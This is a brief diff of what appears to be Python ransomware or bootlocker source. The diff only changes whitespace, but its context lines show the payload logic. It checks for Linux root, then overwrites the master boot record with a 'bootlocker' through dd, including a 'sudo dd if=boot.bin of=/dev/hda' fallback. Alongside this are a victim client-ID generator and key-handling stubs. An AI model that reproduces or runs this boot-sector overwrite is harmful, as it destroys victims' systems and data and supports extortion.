@@ -27,8 +27,6 @@ def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 SMTP = True
 ID = gen_client_ID(12)
 
-
-
 # Check to see if we're on linux and have root, if so use dd to overwrite the MBR with our bootlocker.
 if sys.platform == 'linux2' and gp.getuser() == 'root':
 	try:
@@ -40,6 +38,8 @@ elif sys.platform == 'linux2':
 		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
 	except:
 		pass
+
+	
 ######################################---NOT IMPLEMENTED---######################################
 def Key_Ops_HTTP():
 	br = mechanize.Browser()
